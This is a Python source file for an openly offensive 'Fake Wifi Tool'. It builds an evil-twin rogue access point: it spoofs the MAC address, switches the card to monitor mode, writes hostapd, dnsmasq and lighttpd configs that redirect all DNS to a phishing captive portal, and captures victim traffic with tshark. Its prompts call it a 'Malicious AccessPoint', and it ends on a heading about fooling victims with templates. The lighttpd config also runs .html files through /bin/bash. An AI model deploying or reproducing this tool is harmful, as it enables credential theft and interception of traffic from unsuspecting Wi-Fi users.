#!/usr/bin/python3
#FakeWifiTool


#PART 2 - CREATING THE CLASS, THE "UI" AND THE LOOP THAT MAKES EVERYTHING WORK

import os 
import click
import time
import subprocess as sp

#Tool Class
class tool:
    # This is the Banner with the current status of the hardware, Card Mode, MacAdress and Card used.
    def printBanner(self, interface, macCardColor, permanentMacAdress, currentMacAdress, cardMode, monitorModeColor):
        self.banner1 = f"""                ______ _    _ _____ 
                |  ___| |  | |_   _|
                | |_  | |  | | | |  
                |  _| | |/\| | | |  
                | |   \  /\  / | |  
                \_|    \/  \/  \_/ 
            Using Fake Wifi Tool: V1.2.0
             by theCodemander & D3Ext
  Github: https://github.com/theCodemander/FWI_Tool


    
    
        \33[37m  Current Wifi Card: {interface}
        \33[37m  Current Mac: \33[{macCardColor}m {currentMacAdress}
        \33[37m  Permanent Mac: {permanentMacAdress}
        
        \33[37m  Is Card in Monitor Mode: \33[{monitorModeColor}m {cardMode}\33[37m 
            
    
    
      Use "help" to see avilable Commands

    """

        print(self.banner1)

    def __init__(self, interface):

        self.interface = interface
        self.currentMacAdress = ""
        self.permanentMacAdress = ""

        self.cardMode = ""
        self.monitorModeColor = "31"
        self.macCardColor = "31"
        self.wlanMode = ""
        self.output = ""

        #Detect the Macadress from the current Networking Card
        temp = sp.run(["macchanger", "-s", f"{self.interface}"], stdout=sp.PIPE)
        self.currentMacAdress = str(temp.stdout.decode().split("\n"))
        self.permanentMacAdress = self.currentMacAdress.split()[0]
        self.currentMacAdress = self.currentMacAdress.split()[2]
        self.checkInterfaceMode()

        self.printBanner(self.interface,self.macCardColor,self.permanentMacAdress,self.currentMacAdress,self.cardMode,self.monitorModeColor)
        while True:
            
            try:
                # Detect if the Network Card is in Monitor mode
                self.checkInterfaceMode()

                # Check the Mac Address
                self.checkMacAdress()
                os.system("clear")
                self.printBanner(self.interface,self.macCardColor,self.permanentMacAdress,self.currentMacAdress,self.cardMode,self.monitorModeColor)                        
                print(self.output)
                # User enters here its input to perform different actions
                command  = input(">> ")
                self.output = ""
                # Check input
                match (command):
                    case "exit":
                        exit()
                    case "help":
                        self.output = "help, clear, changeMac, revertMac, setMonitor, setManaged, restartNetworking, killNetworking, startCaptivePortal"
                    case "clear":
                        os.system("clear")
                    case "changeMac":
                        self.output = self.changeMacAdress(self.interface)
                        
                    case "revertMac":
                        self.output = self.revertMacAdress(self.interface)
                        self.permanentMacAdress = self.currentMacAdress.split()[0]
                        
                    case "setMonitor":
                        self.setMonitorMode(self.interface)
                    case "setManaged":
                        self.setManagedMode(self.interface)
                    case "restartNetworking":
                        if self.cardMode != "Yes":
                            self.restartAllNetworking()
                        else:
                            self.output = "Please set the Card to Managed Mode before you restart the Network"
                    case "killNetworking":
                        self.killAllNetworking()
                    case "startCaptivePortal":
                        self.startCaptivePortal()
                    case _:
                        self.output = "\nPlease use a existing Command"
            except KeyboardInterrupt: # Enter here when Ctrl+C is detected
                print("\nPlease type the 'exit' command to exit the program.")
                time.sleep(1)


#PART 3 - DEFINEING ALL THE FUNCTIONS FOR THE PROGRAM



    # Detect the MAC address from the current network card
    def checkMacAdress(self):
        temp = sp.run(["macchanger", "-s", f"{self.interface}"],stdout=sp.PIPE)
        self.currentMacAdress = str(temp.stdout.decode().split("\n"))
        if(self.currentMacAdress.split()[6] == "Co.,Ltd)',"):
            self.currentMacAdress = self.currentMacAdress.split()[2]
            self.permanentMacAdress = self.currentMacAdress
            self.macCardColor = "31"
        else:
            self.permanentMacAdress = self.currentMacAdress.split()[6]
            self.currentMacAdress = self.currentMacAdress.split()[2]
            self.macCardColor = "32"

    # Change the MAC address of the current network card
    def changeMacAdress(self, interface):
        sp.run(["ifconfig",f"{interface}","down"])
        s = sp.run(["macchanger", "-r", f"{interface}"], shell=False, stdout=sp.PIPE, stderr=sp.STDOUT)
        sp.run(["ifconfig", f"{interface}", "up"])
        macOutput = s.stdout.decode().split("\n")
        output = str(macOutput[0])+"\n"+str(macOutput[1])+"\n"+str(macOutput[2])+"\n"
        self.macCardColor = "32"
        return output

    # Revert card's original adress
    def revertMacAdress(self, interface):
        sp.run(["ifconfig",f"{interface}","down"])
        s = sp.run(["macchanger", "-p", f"{interface}"], shell=False, stdout=sp.PIPE, stderr=sp.STDOUT)
        sp.run(["ifconfig",f"{interface}","up"])
        macOutput = s.stdout.decode().split("\n")
        output = str(macOutput[0])+"\n"+str(macOutput[1])+"\n"+str(macOutput[2])+"\n"
        self.macCardColor = "31"
        return output

    # Set the Card to Monitor Mode
    def setMonitorMode(self, interface):
        if self.cardMode == "No":
            sp.run(["ifconfig",f"{interface}","down"])
            os.system('iwconfig ' + interface + ' mode monitor')
            os.system(f"ip link set {interface} name {interface}mon")
            sp.run(["ifconfig",f"{interface}mon","up"])
            self.interface = interface+"mon"
            self.output = "Card changed to Monitor mode sucessfully "
        else:
            self.output = "Card is already in Monitor mode"

    # Set the Card to Managed Mode
    def setManagedMode(self, interface):
        if self.cardMode == "Yes":
            sp.run(["ifconfig",f"{interface}","down"])
            os.system('iwconfig ' + interface + ' mode managed')
            size = len(interface)
            self.interface = interface[:size-3]
            os.system(f"ip link set {self.interface}mon name {self.interface}")
            sp.run(["ifconfig",f"{self.interface}","up"])
            output = "Card changed to Managed mode sucessfully"
        else:
            output = "Card is already in Managed mode"

    # Check the current interfaces mode (Managed/Monitor/Master)
    def checkInterfaceMode(self):
        temp = sp.run(["iwconfig", self.interface], stdout=sp.PIPE)
        if("Monitor" in str(temp)):
            self.cardMode = "Yes"
            self.monitorModeColor = "32"
        if("Master" in str(temp)):
            self.cardMode = "Yes"
            self.monitorModeColor = "32"  
        if("Managed" in str(temp)):
            self.cardMode = "No"
            self.monitorModeColor = "31"
        

    # Kills all posible processes that may disturb packet sending and receiving
    def killAllNetworking(self):
        s = sp.run(["airmon-ng","check","kill"],stderr=sp.STDOUT)
        os.system("killall hostapd dnsmasq dhcpd")
        self.output = "Killed posible conflicting processes"
    
    # Restarts Networking
    def restartAllNetworking(self):
        os.system("systemctl restart NetworkManager")
        os.system("systemctl start wpa_supplicant")
        os.system("systemctl start dhcpd")
        self.output = "Restarted Networking"



# PART 4 - DEFINE THE CONFIG FILES FOR HOSTAPD, DNSMASQ AND LIGHTTPD





    # Create hostapd config file
    def writeHostapdConf(self,card,ssid,channel,hw_mode):
        f = open("/opt/fwt/main/cache/hostapd.conf", "w")
        f.write(f'''interface={card}
ssid={ssid}
channel={channel}
hw_mode={hw_mode}
driver=nl80211''')
        f.close()

    # Create dnsmasq config file
    def writeDnsMasqConf(self, card):
        f = open("/opt/fwt/main/cache/dnsmasq.conf","w")
        #dhcp-authoritative
        f.write(f'''#Set the wireless interface
interface={card}
#Set the IP range for the clients
dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,10h 
#Set Gateway IP Adress
dhcp-option=3,192.168.1.1
#Set the DNS server adress
dhcp-option=6,192.168.1.1
#Redirect all requests to 192.168.1.1
address=/#/192.168.1.1''')

    # Create lighttpd config file
    def writeLighttpdConf(self, templatePath):
        f = open("/opt/fwt/main/cache/lighttpd.conf","w")
        f.write("server.document-root = \"" + templatePath + '''\"
server.modules = (
"mod_auth",
"mod_cgi",
"mod_redirect"
)

$HTTP["host"] =~ "(.*)" {
url.redirect = ( "^/index.htm$" => "/")
url.redirect-code = 302
}

$HTTP["host"] =~ "gstatic.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.gstatic.com/")
url.redirect-code = 302
}

$HTTP["host"] =~ "captive.apple.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.apple.com/")
url.redirect-code = 302
}

$HTTP["host"] =~ "msftconnecttest.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
url.redirect-code = 302
}

$HTTP["host"] =~ "msftncsi.com" {
url.redirect = ( "^/(.*)$" => "http://connectivitycheck.microsoft.com/")
url.redirect-code = 302
}

server.port = 80

index-file.names = ( 
"index.php",
"index.html",
"index.htm" )
server.error-handler-404 = "/"

mimetype.assign = (
".css" => "text/css",
".js" => "text/javascript"
)

cgi.assign = ( 
".htm" => "/bin/bash",
".html" => "/bin/bash"
)


''')

#PART 5 - THE CAPTIVE PORTAL FUNCITION, HOW IT WORKS AND WHAT EVERY COMMAND DOES



    def startCaptivePortal(self):
        print('''
 _____             _   _            ______          _        _ 
/  __ \           | | (_)           | ___ \        | |      | |
| /  \/ __ _ _ __ | |_ ___   _____  | |_/ /__  _ __| |_ __ _| |
| |    / _` | '_ \| __| \ \ / / _ \ |  __/ _ \| '__| __/ _` | |
| \__/\ (_| | |_) | |_| |\ V /  __/ | | | (_) | |  | || (_| | |
 \____/\__,_| .__/ \__|_| \_/ \___| \_|  \___/|_|   \__\__,_|_|
            | |                                                
            |_|   
            \n''')

        os.system("fuser -k 80/tcp &>/dev/null")
        os.system("killall hostapd dnsmasq dhcpd lighttpd &>/dev/null")

        #Setting up the configuration Files
        #if self.cardMode == "Yes":
        if True == True:
            try:
                templates = []  
                NetworkCard = input("Network card the AccessPoint should use (default: wlan0mon) \>> ")
                if NetworkCard == '':
                    NetworkCard = "wlan0mon"
                AccesspointName = input("Malicious AccessPoint name (default: FreeWifi) \>> ")
                if AccesspointName == "":
                    AccesspointName = "FreeWifi"
                while True:
                    try:
                        APchannel= int(input("Enter the channel the AP should use \>> "))
                    except ValueError:
                        print("Please enter a valid channel NUMBER")
                        continue
                    else:
                        break
                # Check if given channel is on 2.4Ghz or 5Ghz
                if APchannel < 15:
                    APhw_mode="g" #2.5Ghz 
                else:
                    APhw_mode="a" #5Ghz
                
                # Check if config files exist to remove them so them aren't overwritten
                if os.path.isfile("/opt/fwt/main/cache/hostapd.conf"):
                    os.remove("/opt/fwt/main/cache/hostapd.conf")
                self.writeHostapdConf(NetworkCard, AccesspointName, APchannel, APhw_mode)

                if os.path.isfile("/opt/fwt/main/cache/dnsmasq.conf"):
                    os.remove("/opt/fwt/main/cache/dnsmasq.conf")
                self.writeDnsMasqConf(NetworkCard)
            
                #Selecting AP Template
                folder="/opt/fwt/main/templates"
                for f in os.scandir(folder):
                    if f.is_dir():
                        templates.append(str(f).split("'")[1])

                while True:
                    selectedTemplate = input(f"""What template do you want to use?: {templates} \>> """)
                    if selectedTemplate not in templates:
                        print("Please enter a valid Template.")
                        time.sleep(2)
                        continue
                    else:
                        templatePath = "/opt/fwt/main/templates/"+str(selectedTemplate)
                        break
                
                # Create lighttpd config file and remove previous one if exists
                if os.path.isfile("/opt/fwt/main/cache/lighttpd.conf"):
                    os.remove("/opt/fwt/main/cache/lighttpd.conf")
                self.writeLighttpdConf(templatePath)

                # Ensure port 53 is free
                os.system("systemctl stop systemd-resolved 2>/dev/null")

                # Add some delay between each action to ensure all works as expected
                time.sleep(1)
                # Execute dnsmasq
                os.system("xterm -bg black -fg white -hold -e 'dnsmasq -C /opt/fwt/main/cache/dnsmasq.conf -d' >/dev/null 2>&1 &")
                time.sleep(3)
                # Execute hostapd
                os.system("xterm -bg black -fg white -hold -e 'hostapd /opt/fwt/main/cache/hostapd.conf' >/dev/null 2>&1 &")
                time.sleep(1)
                os.system(f"ifconfig {NetworkCard} 192.168.1.1 netmask 255.255.255.0")
                time.sleep(2)
                # Execute lighttpd
                os.system("xterm -bg black -fg white -hold -e 'lighttpd -D -f /opt/fwt/main/cache/lighttpd.conf' >/dev/null 2>&1 &")
                time.sleep(3)
                # Execute tshark
                os.system(f"xterm -bg black -fg white -hold -e 'tshark -i {NetworkCard} -w /opt/fwt/main/captures/capture.cap' >/dev/null 2>&1 &")
                time.sleep(1)

                print("Starting Malicious AP...")
                print("Evil Twin Deployed Successfully")
                time.sleep(1)
                os.system("clear")
                while True:
                    os.system("clear")
                    print('''
 _____             _   _            ______          _        _ 
/  __ \           | | (_)           | ___ \        | |      | |
| /  \/ __ _ _ __ | |_ ___   _____  | |_/ /__  _ __| |_ __ _| |
| |    / _` | '_ \| __| \ \ / / _ \ |  __/ _ \| '__| __/ _` | |
| \__/\ (_| | |_) | |_| |\ V /  __/ | | | (_) | |  | || (_| | |
 \____/\__,_| .__/ \__|_| \_/ \___| \_|  \___/|_|   \__\__,_|_|
            | |                                                
            |_|   
        \n''')
                    try:
                        print(f"Selected Template: {selectedTemplate}")
                        print("Press Ctrl + C to stop the attack")
                    except KeyboardInterrupt:
                        os.system("hostapd /opt/fwt/cache/hostapd.conf -B")
                        os.system("killall hostapd dnsmasq dhcpd &>/dev/null")
                        os.system("systemctl restart systemd-resolved 2>/dev/null")
                        break
                    time.sleep(1)

            except KeyboardInterrupt:
                os.system("systemctl stop httpd")
                os.system("fuser -k 80/tcp &>/dev/null")
                os.system("killall hostapd dnsmasq dhcpd &>/dev/null")
        
        #else:
        #    self.output = "Please change the Card to Monitor mode"
        









# PART 1 - STARTING THE TOOL IN THE COMAND-LINE


# Uses Click package to make the tool a CLI Tool
@click.command()
@click.option("--interface","-i", type=str, help="Wlan card used with the tool(monitor mode option is required!)")

# Starting Program
def start(interface):
    try:
        # Checks if the user runs the Tool as sudo, else it does not start
        if not os.environ.get("SUDO_UID"):
            click.echo("You need to run this command as \33[31mroot\33[37m!")
            quit()
        else:
            interface = tool(interface) 

    except IndexError:
        click.echo("ERROR: Check that the selected card exists.")

start()






#PART 6 - HOW TO FOOL A VICTIM? TEMPLATES!
